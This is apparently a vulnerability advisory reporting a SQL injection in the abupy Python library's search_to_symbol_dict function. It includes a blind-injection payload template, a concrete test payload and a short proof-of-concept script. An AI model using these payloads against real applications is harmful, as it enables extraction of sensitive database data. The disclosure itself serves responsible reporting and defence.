Vulnerability Product: abupy <= v0.4.0  
Vulnerability version: <= v0.4.0  
Vulnerability type: SQL Injection  
Vulnerability Details:  
Vulnerability location: abupy.MarketBu.ABuSymbol.search_to_symbol_dict

SQL Injection in abupy <= v0.4.0 causes arbitrary SQL code execution 

## [](#header-3)PROVE: 

Payload: ```"us10101' union select case when {CODE YOU WANNA EXEC, RETURN TRUE OR FALSE} then 'usJASNW' else 'usTROVW' end where ''='"```  
Test_payload: ```"us10101' union select case when sqlite_version() = '3.31.1' then 'usJASNW' else 'usTROVW' end where ''='"```  
Usage: ```abupy.MarketBu.ABuSymbol.search_to_symbol_dict("us10101' union select case when sqlite_version() = '3.31.1' then 'usJASNW' else 'usTROVW' end where ''='")```  

Firstly download abupy latest version(v0.4.0)
```
pip install abupy
```

Secondly import abupy.MarketBu.ABuSymbol, and call abupy.MarketBu.ABuSymbol.search_to_symbol_dict with test_payload as argument
```py
import abupy.MarketBu.ABuSymbol
print(abupy.MarketBu.ABuSymbol.search_to_symbol_dict("us10101' union select case when sqlite_version() = '3.31.1' then 'usJASNW' else 'usTROVW' end where ''='"))
```
(abupy.MarketBu.ABuSymbol.search_to_symbol_dict is a functional api which author mentioned in the comments of the function, It is legal and normal for users and programmers to call this function, proof: https://github.com/bbfamily/abu/blob/master/abupy/MarketBu/ABuSymbol.py -> line: 200)  
```py
    symbol搜索对外接口，全匹配symbol code，拼音匹配symbol，别名匹配，模糊匹配公司名称，产品名称等信息
    eg：
        in：
        search_to_symbol_dict('黄金')
        out：
        {'002155': '湖南黄金',
         '600489': '中金黄金',
         '600547': '山东黄金',
         '600766': '园城黄金',
         '600988': '赤峰黄金',
         'ABX': '巴里克黄金',
         'AU0': '黄金',
         'DGL': '黄金基金-PowerShares',
         'DGLD': '黄金3X做空-VelocityShares',
         'DGP': '黄金2X做多-DB',
         'DGZ': '黄金做空-PowerShares',
         'DZZ': '黄金2X做空-DB',
         'EGO': '埃尔拉多黄金公司',
         'GC': '纽约黄金',
         'GEUR': 'Gartman欧元黄金ETF-AdvisorShares ',
         'GLD': '黄金ETF-SPDR',
         'GLL': '黄金2X做空-ProShares',
         'GYEN': 'Gartman日元黄金ETF-AdvisorShares',
         'HMY': '哈莫尼黄金',
         'IAU': '黄金ETF-iShares',
         'KGC': '金罗斯黄金',
         'LIHR': '利希尔黄金',
         'PRME': '全球黄金地段房地产ETF-First Trust Heitman',
         'RGLD': '皇家黄金',
         'UGL': '黄金2x做多-ProShares',
         'UGLD': '黄金3X做多-VelocityShares'}
    :param search: eg：'黄金'， '58'
    :param fast_mode: 是否尽快匹配，速度优先模式
    :return: symbol dict
```


Finally you can find the result is `{'JASNW': 'JASON INDS INC'}`  
if you replace `sqlite_version() = '3.31.1'` with `sqlite_version() != '3.31.1'`  
you can find the result is `{'TROVW': 'TROVAGENE INC'}`

proved the result is determined by payload  
proved sql code execution  

POC: https://github.com/Leeyangee/leeya_bug/blob/main/abupy_poc.py

## [](#header-3)HARM: 

Programmers may mistakenly use abupy.MarketBu.ABuSymbol.search_to_symbol_dict in this library as part of the backend of the web application, allowing attackers to call the function and return sensitive database data.  

The above payload is just an example, attackers can construct a complex payload to obtain complete database sensitive information in a way similar to sql blind injection

discovered by leeya_bug
